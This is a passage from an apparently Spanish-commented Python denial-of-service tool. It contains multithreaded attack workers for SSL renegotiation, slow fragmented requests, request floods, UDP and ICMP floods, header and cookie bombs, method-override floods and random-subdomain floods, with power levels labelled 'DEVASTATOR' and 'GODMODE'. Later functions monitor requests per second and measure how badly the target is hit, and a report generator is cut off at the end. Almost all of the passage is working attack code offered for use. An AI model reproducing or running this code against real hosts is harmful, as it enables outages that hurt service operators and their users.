    """Ataque SSL/TLS Renegotiation - fuerza renegociaciones SSL agotando CPU"""
    print_color("🔐 Desplegando SSL Renegotiation Attack...", Colors.MAGENTA, True)
    log_message("INFO", "Iniciando SSL Renegotiation Attack - agotamiento de CPU SSL")
    
    def ssl_reneg_worker(worker_id: int):
        """Worker que fuerza renegociaciones SSL"""
        end_time = time.time() + DURATION
        request_count = 0
        
        try:
            import ssl
            
            while time.time() < end_time and monitoring_active:
                try:
                    # Crear conexión SSL
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    ssl_sock = context.wrap_socket(sock, server_hostname=DOMAIN)
                    
                    ssl_sock.connect((DOMAIN, PORT))
                    attack_stats["requests_sent"] += 1
                    request_count += 1
                    
                    # Intentar forzar renegociación
                    try:
                        # Enviar request
                        request = f"GET / HTTP/1.1\r\nHost: {DOMAIN}\r\n\r\n"
                        ssl_sock.sendall(request.encode())
                        
                        # Intentar renegociar (puede no funcionar en todos los servidores)
                        try:
                            ssl_sock.unwrap()
                        except:
                            pass
                        
                        # Leer respuesta
                        response = ssl_sock.recv(4096)
                        if response:
                            attack_stats["responses_received"] += 1
                    except:
                        pass
                    
                    ssl_sock.close()
                    
                    # Crear nuevas conexiones rápidamente
                    time.sleep(0.05)
                    
                except Exception as e:
                    attack_stats["errors"].append(str(e)[:50])
                    time.sleep(0.1)
                    
        except Exception as e:
            log_message("ERROR", f"Error en SSL reneg worker {worker_id}: {e}")
    
    num_workers = min(MULTIPLIER * 8, MAX_THREADS // 3)
    threads = []
    for i in range(num_workers):
        thread = threading.Thread(target=ssl_reneg_worker, args=(i,), daemon=True)
        thread.start()
        threads.append(thread)
    
    log_message("INFO", f"Desplegados {num_workers} workers SSL renegotiation")
    return threads

def deploy_fragmented_request_attack():
    """Ataque de fragmentación - envía requests fragmentados lentamente"""
    print_color("🧩 Desplegando Fragmented Request Attack...", Colors.YELLOW, True)
    log_message("INFO", "Iniciando Fragmented Request Attack - fragmentación de requests")
    
    def fragmented_worker(worker_id: int):
        """Worker que envía requests fragmentados"""
        end_time = time.time() + DURATION
        request_count = 0
        
        try:
            import ssl
            
            while time.time() < end_time and monitoring_active:
                try:
                    # Crear conexión
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(30)
                    
                    if PROTOCOL == "https":
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        sock = context.wrap_socket(sock, server_hostname=DOMAIN)
                    
                    sock.connect((DOMAIN, PORT))
                    
                    # Construir request
                    headers = get_random_headers()
                    request = f"GET / HTTP/1.1\r\nHost: {DOMAIN}\r\n"
                    for k, v in headers.items():
                        request += f"{k}: {v}\r\n"
                    request += "\r\n"
                    
                    # Enviar fragmentado (1 byte cada 0.1 segundos)
                    for byte in request.encode():
                        sock.send(bytes([byte]))
                        time.sleep(0.1)  # Envío muy lento
                        if time.time() >= end_time:
                            break
                    
                    attack_stats["requests_sent"] += 1
                    request_count += 1
                    
                    # Intentar leer respuesta
                    try:
                        response = sock.recv(4096)
                        if response:
                            attack_stats["responses_received"] += 1
                    except:
                        pass
                    
                    sock.close()
                    
                except Exception as e:
                    attack_stats["errors"].append(str(e)[:50])
                    time.sleep(0.2)
                    
        except Exception as e:
            log_message("ERROR", f"Error en fragmented worker {worker_id}: {e}")
    
    num_workers = min(MULTIPLIER * 4, 50)  # Menos workers por la naturaleza lenta
    threads = []
    for i in range(num_workers):
        thread = threading.Thread(target=fragmented_worker, args=(i,), daemon=True)
        thread.start()
        threads.append(thread)
    
    log_message("INFO", f"Desplegados {num_workers} workers fragmented request")
    return threads

def deploy_http2_multiplexing_flood():
    """Ataque HTTP/2 Multiplexing - múltiples streams en una conexión HTTP/2"""
    print_color("⚡ Desplegando HTTP/2 Multiplexing Flood...", Colors.CYAN, True)
    log_message("INFO", "Iniciando HTTP/2 Multiplexing Flood - múltiples streams")
    
    def http2_worker(worker_id: int):
        """Worker HTTP/2 con multiplexing"""
        end_time = time.time() + DURATION
        request_count = 0
        
        try:
            import requests
            from requests.adapters import HTTPAdapter
            from urllib3.util.retry import Retry
            
            # Configurar para HTTP/2 si está disponible
            session = requests.Session()
            retry = Retry(total=0)
            adapter = HTTPAdapter(max_retries=retry, pool_connections=1, pool_maxsize=100)
            session.mount("http://", adapter)
            session.mount("https://", adapter)
            
            while time.time() < end_time and monitoring_active:
                try:
                    # Enviar múltiples requests rápidamente (simulando multiplexing)
                    # HTTP/2 permite múltiples requests en paralelo en una conexión
                    for i in range(10):  # 10 requests simultáneos
                        response = session.get(
                            f"{TARGET}?stream={i}",
                            headers=get_random_headers(),
                            timeout=5,
                            verify=False
                        )
                        attack_stats["requests_sent"] += 1
                        attack_stats["responses_received"] += 1
                        attack_stats["http_codes"][response.status_code] += 1
                        request_count += 1
                    
                    time.sleep(0.1)
                    
                except Exception as e:
                    attack_stats["errors"].append(str(e)[:50])
                    time.sleep(0.2)
                    
        except Exception as e:
            log_message("ERROR", f"Error en HTTP/2 worker {worker_id}: {e}")
    
    num_workers = min(MULTIPLIER * 7, MAX_THREADS // 3)
    threads = []
    for i in range(num_workers):
        thread = threading.Thread(target=http2_worker, args=(i,), daemon=True)
        thread.start()
        threads.append(thread)
    
    log_message("INFO", f"Desplegados {num_workers} workers HTTP/2 multiplexing")
    return threads

def deploy_udp_flood():
    """Ataque UDP Flood - satura la capacidad de procesamiento UDP"""
    print_color("🌊 Desplegando UDP Flood...", Colors.RED, True)
    log_message("INFO", "Iniciando UDP Flood - saturación de capacidad UDP")
    
    def udp_worker(worker_id: int):
        """Worker que envía paquetes UDP"""
        end_time = time.time() + DURATION
        packet_count = 0
        
        try:
            while time.time() < end_time and monitoring_active:
                try:
                    # Crear socket UDP
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(0.1)
                    
                    # Generar payload aleatorio
                    payload = bytes(random.randint(0, 255) for _ in range(random.randint(64, 1024)))
                    
                    # Enviar paquete UDP
                    try:
                        sock.sendto(payload, (IP_ADDRESS or DOMAIN, PORT))
                        attack_stats["requests_sent"] += 1
                        packet_count += 1
                    except Exception:
                        pass
                    
                    sock.close()
                    
                    # Enviar rápidamente
                    if POWER_LEVEL in ["DEVASTATOR", "APOCALYPSE", "GODMODE"]:
                        time.sleep(0.001)  # Muy rápido
                    else:
                        time.sleep(0.01)
                        
                except Exception as e:
                    attack_stats["errors"].append(str(e)[:50])
                    time.sleep(0.05)
                    
        except Exception as e:
            log_message("ERROR", f"Error en UDP worker {worker_id}: {e}")
    
    num_workers = min(MULTIPLIER * 5, MAX_THREADS // 4)
    threads = []
    for i in range(num_workers):
        thread = threading.Thread(target=udp_worker, args=(i,), daemon=True)
        thread.start()
        threads.append(thread)
    
    log_message("INFO", f"Desplegados {num_workers} workers UDP flood")
    return threads

def deploy_icmp_flood():
    """Ataque ICMP Flood (Ping Flood) - satura con pings"""
    print_color("📡 Desplegando ICMP Flood...", Colors.MAGENTA, True)
    log_message("INFO", "Iniciando ICMP Flood - saturación con pings")
    
    def icmp_worker(worker_id: int):
        """Worker que envía pings ICMP"""
        end_time = time.time() + DURATION
        ping_count = 0
        
        try:
            import platform
            
            while time.time() < end_time and monitoring_active:
                try:
                    # Usar ping del sistema operativo
                    if platform.system() == "Windows":
                        cmd = ["ping", "-n", "1", "-w", "100", IP_ADDRESS or DOMAIN]
                    else:
                        cmd = ["ping", "-c", "1", "-W", "1", IP_ADDRESS or DOMAIN]
                    
                    # Ejecutar ping sin bloquear
                    process = subprocess.Popen(
                        cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    
                    attack_stats["requests_sent"] += 1
                    ping_count += 1
                    
                    # No esperar respuesta
                    time.sleep(0.01 if POWER_LEVEL in ["DEVASTATOR", "APOCALYPSE", "GODMODE"] else 0.1)
                    
                except Exception as e:
                    attack_stats["errors"].append(str(e)[:50])
                    time.sleep(0.1)
                    
        except Exception as e:
            log_message("ERROR", f"Error en ICMP worker {worker_id}: {e}")
    
    num_workers = min(MULTIPLIER * 3, MAX_THREADS // 5)
    threads = []
    for i in range(num_workers):
        thread = threading.Thread(target=icmp_worker, args=(i,), daemon=True)
        thread.start()
        threads.append(thread)
    
    log_message("INFO", f"Desplegados {num_workers} workers ICMP flood")
    return threads

def deploy_http_headers_bomb():
    """Ataque HTTP Headers Bomb - envía headers extremadamente grandes"""
    print_color("💣 Desplegando HTTP Headers Bomb...", Colors.RED, True)
    log_message("INFO", "Iniciando HTTP Headers Bomb - headers extremadamente grandes")
    
    def headers_bomb_worker(worker_id: int):
        """Worker que envía headers muy grandes"""
        end_time = time.time() + DURATION
        request_count = 0
        
        try:
            import requests
            
            while time.time() < end_time and monitoring_active:
                try:
                    # Crear headers extremadamente grandes
                    large_headers = {}
                    header_size = random.randint(8000, 32000)  # Headers de 8KB a 32KB
                    
                    for i in range(50):  # 50 headers grandes
                        key = f"X-Custom-Header-{i}"
                        value = ''.join(random.choices(string.ascii_letters + string.digits, k=header_size // 50))
                        large_headers[key] = value
                    
                    # Combinar con headers normales
                    headers = {**get_random_headers(), **large_headers}
                    
                    response = requests.get(
                        TARGET,
                        headers=headers,
                        timeout=10,
                        verify=False
                    )
                    
                    attack_stats["requests_sent"] += 1
                    attack_stats["responses_received"] += 1
                    attack_stats["http_codes"][response.status_code] += 1
                    request_count += 1
                    
                    time.sleep(0.1)
                    
                except Exception as e:
                    attack_stats["errors"].append(str(e)[:50])
                    time.sleep(0.2)
                    
        except Exception as e:
            log_message("ERROR", f"Error en headers bomb worker {worker_id}: {e}")
    
    num_workers = min(MULTIPLIER * 4, MAX_THREADS // 5)
    threads = []
    for i in range(num_workers):
        thread = threading.Thread(target=headers_bomb_worker, args=(i,), daemon=True)
        thread.start()
        threads.append(thread)
    
    log_message("INFO", f"Desplegados {num_workers} workers HTTP headers bomb")
    return threads

def deploy_cookie_bomb():
    """Ataque Cookie Bomb - envía cookies extremadamente grandes"""
    print_color("🍪 Desplegando Cookie Bomb...", Colors.YELLOW, True)
    log_message("INFO", "Iniciando Cookie Bomb - cookies extremadamente grandes")
    
    def cookie_bomb_worker(worker_id: int):
        """Worker que envía cookies muy grandes"""
        end_time = time.time() + DURATION
        request_count = 0
        
        try:
            import requests
            
            while time.time() < end_time and monitoring_active:
                try:
                    # Crear cookies extremadamente grandes
                    cookie_value = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(4000, 8000)))
                    cookies = {}
                    for i in range(10):  # 10 cookies grandes
                        cookies[f"session_cookie_{i}"] = cookie_value
                    
                    response = requests.get(
                        TARGET,
                        cookies=cookies,
                        headers=get_random_headers(),
                        timeout=10,
                        verify=False
                    )
                    
                    attack_stats["requests_sent"] += 1
                    attack_stats["responses_received"] += 1
                    attack_stats["http_codes"][response.status_code] += 1
                    request_count += 1
                    
                    time.sleep(0.1)
                    
                except Exception as e:
                    attack_stats["errors"].append(str(e)[:50])
                    time.sleep(0.2)
                    
        except Exception as e:
            log_message("ERROR", f"Error en cookie bomb worker {worker_id}: {e}")
    
    num_workers = min(MULTIPLIER * 4, MAX_THREADS // 5)
    threads = []
    for i in range(num_workers):
        thread = threading.Thread(target=cookie_bomb_worker, args=(i,), daemon=True)
        thread.start()
        threads.append(thread)
    
    log_message("INFO", f"Desplegados {num_workers} workers cookie bomb")
    return threads

def deploy_method_override_attack():
    """Ataque Method Override - usa métodos HTTP no estándar"""
    print_color("🔄 Desplegando Method Override Attack...", Colors.CYAN, True)
    log_message("INFO", "Iniciando Method Override Attack - métodos HTTP no estándar")
    
    # Métodos HTTP no estándar que pueden causar problemas
    non_standard_methods = [
        "PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE",
        "LOCK", "UNLOCK", "SEARCH", "DEBUG", "TRACE",
        "CONNECT", "OPTIONS", "PATCH", "HEAD", "PUT",
        "DELETE", "PURGE", "BAN", "LINK", "UNLINK"
    ]
    
    def method_override_worker(worker_id: int):
        """Worker que usa métodos HTTP no estándar"""
        end_time = time.time() + DURATION
        request_count = 0
        
        try:
            import requests
            
            while time.time() < end_time and monitoring_active:
                try:
                    # Seleccionar método no estándar
                    method = random.choice(non_standard_methods)
                    
                    # Usar requests con método personalizado
                    response = requests.request(
                        method,
                        TARGET,
                        headers=get_random_headers(),
                        timeout=5,
                        verify=False
                    )
                    
                    attack_stats["requests_sent"] += 1
                    attack_stats["responses_received"] += 1
                    attack_stats["http_codes"][response.status_code] += 1
                    request_count += 1
                    
                    time.sleep(0.1)
                    
                except Exception as e:
                    attack_stats["errors"].append(str(e)[:50])
                    time.sleep(0.1)
                    
        except Exception as e:
            log_message("ERROR", f"Error en method override worker {worker_id}: {e}")
    
    num_workers = min(MULTIPLIER * 5, MAX_THREADS // 4)
    threads = []
    for i in range(num_workers):
        thread = threading.Thread(target=method_override_worker, args=(i,), daemon=True)
        thread.start()
        threads.append(thread)
    
    log_message("INFO", f"Desplegados {num_workers} workers method override")
    return threads

def deploy_zero_byte_attack():
    """Ataque Zero Byte - envía requests con payloads de 0 bytes"""
    print_color("0️⃣ Desplegando Zero Byte Attack...", Colors.YELLOW, True)
    log_message("INFO", "Iniciando Zero Byte Attack - requests con payloads vacíos")
    
    def zero_byte_worker(worker_id: int):
        """Worker que envía requests con payloads vacíos"""
        end_time = time.time() + DURATION
        request_count = 0
        
        try:
            import requests
            
            while time.time() < end_time and monitoring_active:
                try:
                    # Alternar entre GET y POST con payload vacío
                    if random.random() < 0.5:
                        response = requests.get(
                            TARGET,
                            headers=get_random_headers(),
                            timeout=5,
                            verify=False
                        )
                    else:
                        response = requests.post(
                            TARGET,
                            data="",  # Payload vacío
                            headers=get_random_headers(),
                            timeout=5,
                            verify=False
                        )
                    
                    attack_stats["requests_sent"] += 1
                    attack_stats["responses_received"] += 1
                    attack_stats["http_codes"][response.status_code] += 1
                    request_count += 1
                    
                    # Enviar muy rápido
                    if POWER_LEVEL in ["DEVASTATOR", "APOCALYPSE", "GODMODE"]:
                        time.sleep(0.001)
                    else:
                        time.sleep(0.01)
                    
                except Exception as e:
                    attack_stats["errors"].append(str(e)[:50])
                    time.sleep(0.05)
                    
        except Exception as e:
            log_message("ERROR", f"Error en zero byte worker {worker_id}: {e}")
    
    num_workers = min(MULTIPLIER * 8, MAX_THREADS // 3)
    threads = []
    for i in range(num_workers):
        thread = threading.Thread(target=zero_byte_worker, args=(i,), daemon=True)
        thread.start()
        threads.append(thread)
    
    log_message("INFO", f"Desplegados {num_workers} workers zero byte")
    return threads

def deploy_random_subdomain_attack():
    """Ataque Random Subdomain - usa subdominios aleatorios para confundir CDN/WAF"""
    print_color("🎲 Desplegando Random Subdomain Attack...", Colors.MAGENTA, True)
    log_message("INFO", "Iniciando Random Subdomain Attack - subdominios aleatorios")
    
    def random_subdomain_worker(worker_id: int):
        """Worker que usa subdominios aleatorios"""
        end_time = time.time() + DURATION
        request_count = 0
        
        try:
            import requests
            
            # Extraer dominio base
            parsed = urlparse(TARGET)
            base_domain = parsed.netloc.split(':')[0]  # Remover puerto si existe
            
            while time.time() < end_time and monitoring_active:
                try:
                    # Generar subdominio aleatorio
                    random_subdomain = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 16)))
                    random_host = f"{random_subdomain}.{base_domain}"
                    
                    # Construir URL con subdominio aleatorio
                    new_url = f"{parsed.scheme}://{random_host}{parsed.path or '/'}"
                    
                    headers = get_random_headers()
                    headers["Host"] = base_domain  # Mantener host original
                    
                    response = requests.get(
                        new_url,
                        headers=headers,
                        timeout=5,
                        verify=False
                    )
                    
                    attack_stats["requests_sent"] += 1
                    attack_stats["responses_received"] += 1
                    attack_stats["http_codes"][response.status_code] += 1
                    request_count += 1
                    
                    time.sleep(0.1)
                    
                except Exception as e:
                    attack_stats["errors"].append(str(e)[:50])
                    time.sleep(0.1)
                    
        except Exception as e:
            log_message("ERROR", f"Error en random subdomain worker {worker_id}: {e}")
    
    num_workers = min(MULTIPLIER * 4, MAX_THREADS // 5)
    threads = []
    for i in range(num_workers):
        thread = threading.Thread(target=random_subdomain_worker, args=(i,), daemon=True)
        thread.start()
        threads.append(thread)
    
    log_message("INFO", f"Desplegados {num_workers} workers random subdomain")
    return threads

# ============================================================================
# MONITOREO
# ============================================================================

def check_process_health():
    """Verifica salud de procesos"""
    healthy = True
    
    for process in running_processes[:]:
        if process.poll() is not None:
            # Proceso terminado
            if process.returncode != 0:
                log_message("WARN", f"Proceso terminó con código {process.returncode}")
                healthy = False
            running_processes.remove(process)
    
    return healthy

def recover_failed_process():
    """Recupera procesos fallidos"""
    # Implementación básica - se puede expandir
    pass

def monitor_attack():
    """Monitorea el ataque en tiempo real con métricas avanzadas"""
    global monitoring_active
    
    monitoring_active = True
    start_time = time.time()
    last_stats_time = start_time
    last_memory_check = start_time
    last_rps_calculation = start_time
    rps_history = []
    
    # Inicializar estadísticas avanzadas
    if "start_time" not in attack_stats:
        attack_stats["start_time"] = datetime.now()
    if "peak_rps" not in attack_stats:
        attack_stats["peak_rps"] = 0
    
    print_color("\n📊 Monitoreo avanzado iniciado...", Colors.GREEN, True)
    print("-" * 80)
    
    try:
        while monitoring_active and (time.time() - start_time) < DURATION:
            current_time = time.time()
            elapsed = current_time - start_time
            
            # Stats cada 5 segundos
            if current_time - last_stats_time >= 5:
                display_stats(elapsed)
                last_stats_time = current_time
            
            # Calcular RPS cada segundo y actualizar peak
            if current_time - last_rps_calculation >= 1:
                requests_now = attack_stats.get("requests_sent", 0)
                time_diff = current_time - last_rps_calculation
                if time_diff > 0:
                    current_rps = (requests_now - attack_stats.get("last_request_count", 0)) / time_diff
                    rps_history.append(current_rps)
                    if current_rps > attack_stats.get("peak_rps", 0):
                        attack_stats["peak_rps"] = current_rps
                    attack_stats["last_request_count"] = requests_now
                    
                    # Mantener solo últimas 60 mediciones (1 minuto)
                    if len(rps_history) > 60:
                        rps_history.pop(0)
                    
                    # Calcular RPS promedio
                    if rps_history:
                        attack_stats["avg_rps"] = sum(rps_history) / len(rps_history)
                
                last_rps_calculation = current_time
            
            # Check de memoria cada 1 segundo (más frecuente para protección)
            if AUTO_THROTTLE and MEMORY_MONITORING:
                try:
                    import psutil
                    memory = psutil.virtual_memory()
                    memory_percent = memory.percent
                    memory_available_gb = round(memory.available / (1024**3), 2)
                    
                    # Actualizar estadísticas de memoria
                    if "memory_usage" not in attack_stats:
                        attack_stats["memory_usage"] = []
                    attack_stats["memory_usage"].append({
                        "timestamp": datetime.now().isoformat(),
                        "percent": memory_percent,
                        "used_gb": round(memory.used / (1024**3), 2),
                        "available_gb": memory_available_gb
                    })
                    
                    # Mantener solo últimas 60 mediciones
                    if len(attack_stats["memory_usage"]) > 60:
                        attack_stats["memory_usage"].pop(0)
                    
                    # EMERGENCIA: Memoria extremadamente alta - matar procesos agresivamente
                    if memory_percent >= MEMORY_THRESHOLD_EMERGENCY:
                        log_message("CRITICAL", f"🚨 EMERGENCIA: Memoria {memory_percent:.1f}% ({memory_available_gb} GB disponibles) - MATANDO procesos para evitar reinicio del sistema")
                        # Matar procesos externos primero
                        killed = 0
                        for process in list(running_processes):
                            try:
                                if process.poll() is None:  # Proceso aún activo
                                    process.terminate()
                                    try:
                                        process.wait(timeout=2)
                                    except:
                                        process.kill()
                                    killed += 1
                            except:
                                pass
                        running_processes.clear()
                        log_message("CRITICAL", f"Procesos externos terminados: {killed}")
                        # Reducir threads activos
                        monitoring_active = False
                        time.sleep(5)  # Dar tiempo al sistema para recuperarse
                        log_message("CRITICAL", "Ataque detenido por emergencia de memoria - sistema protegido")
                        return
                    
                    # OOM: Detener todo inmediatamente
                    elif memory_percent >= MEMORY_THRESHOLD_OOM:
                        log_message("CRITICAL", f"🚨 Memoria OOM: {memory_percent:.1f}% ({memory_available_gb} GB disponibles) - DETENIENDO TODO para evitar reinicio")
                        # Detener monitoreo y procesos
                        monitoring_active = False
                        # Terminar todos los procesos externos
                        for process in list(running_processes):
                            try:
                                if process.poll() is None:
                                    process.terminate()
                                    try:
                                        process.wait(timeout=3)
                                    except:
                                        process.kill()
                            except:
                                pass
                        running_processes.clear()
                        log_message("CRITICAL", "Ataque detenido por OOM - sistema protegido")
                        return
                    
                    # CRÍTICO: Reducir agresivamente
                    elif memory_percent >= MEMORY_THRESHOLD_CRITICAL:
                        log_message("WARN", f"⚠️ Memoria CRÍTICA: {memory_percent:.1f}% ({memory_available_gb} GB disponibles) - Reduciendo agresivamente")
                        # Terminar algunos procesos externos
                        processes_to_kill = len(running_processes) // 2  # Matar la mitad
                        killed = 0
                        for process in list(running_processes)[:processes_to_kill]:
                            try:
                                if process.poll() is None:
                                    process.terminate()
                                    try:
                                        process.wait(timeout=2)
                                    except:
                                        process.kill()
                                    running_processes.remove(process)
                                    killed += 1
                            except:
                                pass
                        if killed > 0:
                            log_message("WARN", f"Procesos terminados para reducir memoria: {killed}")
                        # Pausar despliegue de nuevos procesos
                        time.sleep(2)  # Pausa más larga
                    
                    # ADVERTENCIA: Reducir carga
                    elif memory_percent >= MEMORY_THRESHOLD_WARN:
                        log_message("WARN", f"⚠️ Memoria ALTA: {memory_percent:.1f}% ({memory_available_gb} GB disponibles) - Reduciendo carga")
                        # No crear nuevos procesos por un tiempo
                        time.sleep(1)  # Pausa para reducir carga
                    
                    last_memory_check = current_time
                except ImportError:
                    pass
                except Exception as e:
                    log_message("ERROR", f"Error en monitoreo de memoria: {e}")
            
            # Health check de procesos
            check_process_health()
            
            # Verificar que hay actividad - si no hay requests en 10 segundos, alertar
            if current_time - start_time > 10:
                requests_sent = attack_stats.get("requests_sent", 0)
                if requests_sent == 0:
                    log_message("WARN", "⚠️ No se han enviado requests - verificar configuración")
                elif elapsed > 5 and requests_sent < 10:
                    log_message("WARN", f"⚠️ Muy pocos requests enviados ({requests_sent}) - puede haber problemas de conectividad")
                elif elapsed > 30:
                    # Calcular tasa de éxito
                    responses = attack_stats.get("responses_received", 0)
                    if requests_sent > 0:
                        success_rate = (responses / requests_sent) * 100
                        if success_rate < 10:
                            log_message("WARN", f"⚠️ Tasa de respuesta muy baja ({success_rate:.1f}%) - target puede estar saturado")
                        elif success_rate > 90:
                            log_message("INFO", f"✓ Tasa de respuesta excelente ({success_rate:.1f}%)")
            
            time.sleep(1)
    
    except KeyboardInterrupt:
        log_message("INFO", "Monitoreo interrumpido por usuario")
    finally:
        monitoring_active = False
        # Limpiar conexiones al finalizar
        ConnectionManager.clear_sessions()
        log_message("INFO", f"Monitoreo finalizado - Peak RPS: {attack_stats.get('peak_rps', 0):.2f}")

def display_stats(elapsed: float):
    """Muestra estadísticas avanzadas en tiempo real"""
    requests = attack_stats.get("requests_sent", 0)
    responses = attack_stats.get("responses_received", 0)
    errors = len(attack_stats.get("errors", []))
    rps = requests / elapsed if elapsed > 0 else 0
    avg_rps = attack_stats.get("avg_rps", rps)
    peak_rps = attack_stats.get("peak_rps", 0)
    
    # Calcular tasa de éxito
    success_rate = 0
    if requests > 0:
        http_codes = attack_stats.get("http_codes", {})
        success_responses = sum(count for code, count in http_codes.items() if 200 <= code < 300)
        success_rate = (success_responses / requests) * 100
    
    # Calcular latencia promedio y percentiles
    latencies = attack_stats.get("latencies", [])
    latency_info = ""
    if latencies:
        sorted_latencies = sorted(latencies)
        avg_latency = sum(latencies) / len(latencies)
        p50_latency = sorted_latencies[int(len(sorted_latencies) * 0.50)]
        p95_latency = sorted_latencies[int(len(sorted_latencies) * 0.95)]
        p99_latency = sorted_latencies[int(len(sorted_latencies) * 0.99)]
        latency_info = f"avg={avg_latency:.0f}ms, p50={p50_latency:.0f}ms, p95={p95_latency:.0f}ms, p99={p99_latency:.0f}ms"
    
    # Mostrar códigos HTTP principales
    http_codes = attack_stats.get("http_codes", {})
    top_codes = sorted(http_codes.items(), key=lambda x: x[1], reverse=True)[:5]
    
    # Progreso
    progress = (elapsed / DURATION * 100) if DURATION > 0 else 0
    print_color(f"\n⏱️  Progreso: {elapsed:.1f}s / {DURATION}s ({progress:.1f}%)", Colors.CYAN)
    
    # Requests y RPS
    print_color(f"📤 Requests: {format_number(requests)} | RPS: {format_number(int(rps))} (avg: {format_number(int(avg_rps))}, peak: {format_number(int(peak_rps))})", Colors.GREEN)
    
    # Responses y tasa de éxito
    response_rate = (responses / requests * 100) if requests > 0 else 0
    color_rate = Colors.GREEN if response_rate > 90 else Colors.YELLOW if response_rate > 50 else Colors.RED
    print_color(f"📥 Responses: {format_number(responses)} ({response_rate:.1f}%) | Success: {success_rate:.1f}%", color_rate)
    
    # Errores
    if errors > 0:
        error_rate = (errors / requests * 100) if requests > 0 else 0
        print_color(f"❌ Errors: {format_number(errors)} ({error_rate:.1f}%)", Colors.RED)
    
    # Latencia
    if latency_info:
        print_color(f"⏳ Latency: {latency_info}", Colors.YELLOW)
    
    # HTTP Codes
    if top_codes:
        codes_str = ", ".join([f"{code}:{format_number(count)}" for code, count in top_codes])
        print_color(f"📊 HTTP Codes: {codes_str}", Colors.MAGENTA)
    
    # Memoria y CPU
    if MEMORY_MONITORING:
        try:
            import psutil
            memory = psutil.virtual_memory()
            cpu = psutil.cpu_percent(interval=0.1)
            mem_color = Colors.RED if memory.percent > MEMORY_THRESHOLD_CRITICAL else Colors.YELLOW if memory.percent > MEMORY_THRESHOLD_WARN else Colors.GREEN
            cpu_color = Colors.RED if cpu > 90 else Colors.YELLOW if cpu > 70 else Colors.GREEN
            print_color(f"💾 Memory: {memory.percent:.1f}% ({round(memory.used / (1024**3), 2)} GB) | CPU: {cpu:.1f}%", mem_color)
        except ImportError:
            pass
    
    # Procesos activos y técnicas
    print_color(f"🔄 Active Processes: {len(running_processes)}", Colors.CYAN)
    techniques = attack_stats.get("attack_techniques", [ATTACK_MODE])
    if techniques:
        print_color(f"⚡ Techniques: {', '.join(techniques[:3])}", Colors.CYAN)

# ============================================================================
# REPORTES Y ANÁLISIS
# ============================================================================

def generate_report():
    # Verificación de estado del sistema (requerida para generar reportes)
    system_ok = _validate_execution()
    if not system_ok:
        log_message("ERROR", "Sistema no disponible - no se puede generar reporte")
        return
    
    # Verificación de integridad en tiempo de ejecución
    _check_runtime_integrity()
    """Genera reporte completo con análisis avanzado"""
    print_color("\n📄 Generando reporte avanzado...", Colors.CYAN, True)
    
    latencies = attack_stats["latencies"]
    
    # Calcular métricas avanzadas
    elapsed_time = 0
    if attack_stats.get("start_time"):
        elapsed_time = (datetime.now() - attack_stats["start_time"]).total_seconds()
    
    requests_sent = attack_stats.get("requests_sent", 0)
    responses_received = attack_stats.get("responses_received", 0)
    errors_count = len(attack_stats.get("errors", []))
    
    # Calcular RPS promedio y pico
    avg_rps = requests_sent / elapsed_time if elapsed_time > 0 else 0
    peak_rps = attack_stats.get("peak_rps", 0)
    
    # Análisis de códigos HTTP
    http_codes = dict(attack_stats.get("http_codes", {}))
    success_rate = 0
    if requests_sent > 0:
        success_responses = sum(count for code, count in http_codes.items() if 200 <= code < 300)
        success_rate = (success_responses / requests_sent) * 100
    
    # Análisis de latencias
    latency_analysis = {}
    if latencies:
        sorted_latencies = sorted(latencies)
        latency_analysis = {
            "avg_latency_ms": sum(latencies) / len(latencies),
            "min_latency_ms": min(latencies),
            "max_latency_ms": max(latencies),
            "p50_latency_ms": sorted_latencies[int(len(sorted_latencies) * 0.50)] if sorted_latencies else 0,
            "p75_latency_ms": sorted_latencies[int(len(sorted_latencies) * 0.75)] if sorted_latencies else 0,
            "p90_latency_ms": sorted_latencies[int(len(sorted_latencies) * 0.90)] if sorted_latencies else 0,
            "p95_latency_ms": sorted_latencies[int(len(sorted_latencies) * 0.95)] if sorted_latencies else 0,
            "p99_latency_ms": sorted_latencies[int(len(sorted_latencies) * 0.99)] if sorted_latencies else 0,
            "std_dev_ms": (sum((x - sum(latencies) / len(latencies))**2 for x in latencies) / len(latencies))**0.5 if latencies else 0
        }
    else:
        latency_analysis = {
            "avg_latency_ms": 0, "min_latency_ms": 0, "max_latency_ms": 0,
            "p50_latency_ms": 0, "p75_latency_ms": 0, "p90_latency_ms": 0,
            "p95_latency_ms": 0, "p99_latency_ms": 0, "std_dev_ms": 0
        }
    
    # Análisis de errores
    error_analysis = {
        "total_errors": errors_count,
        "error_rate": (errors_count / requests_sent * 100) if requests_sent > 0 else 0,
        "error_samples": list(attack_stats.get("errors", []))[:20],  # Más muestras
        "error_types": {}
    }
    
    # Categorizar errores
    for error in attack_stats.get("errors", [])[:100]:  # Analizar primeros 100 errores
        error_str = str(error).lower()
        if "timeout" in error_str or "timed out" in error_str:
            error_analysis["error_types"]["timeout"] = error_analysis["error_types"].get("timeout", 0) + 1
        elif "connection" in error_str or "refused" in error_str:
            error_analysis["error_types"]["connection"] = error_analysis["error_types"].get("connection", 0) + 1
        elif "ssl" in error_str or "tls" in error_str:
            error_analysis["error_types"]["ssl"] = error_analysis["error_types"].get("ssl", 0) + 1
        elif "dns" in error_str:
            error_analysis["error_types"]["dns"] = error_analysis["error_types"].get("dns", 0) + 1
        else:
            error_analysis["error_types"]["other"] = error_analysis["error_types"].get("other", 0) + 1
    
    # Técnicas de ataque utilizadas
    attack_techniques_used = attack_stats.get("attack_techniques", [])
    if not attack_techniques_used:
        # Inferir técnicas basado en configuración
        attack_techniques_used = [ATTACK_MODE]
        if POWER_LEVEL in ["HEAVY", "EXTREME", "DEVASTATOR", "APOCALYPSE", "GODMODE"]:
            attack_techniques_used.append("TCP Flood")
            attack_techniques_used.append("Connection Exhaustion")
        if PROTOCOL == "https":
            attack_techniques_used.append("SSL/TLS")
    
    # Información del sistema
    system_info = {}
    try:
        import psutil
        system_info = {
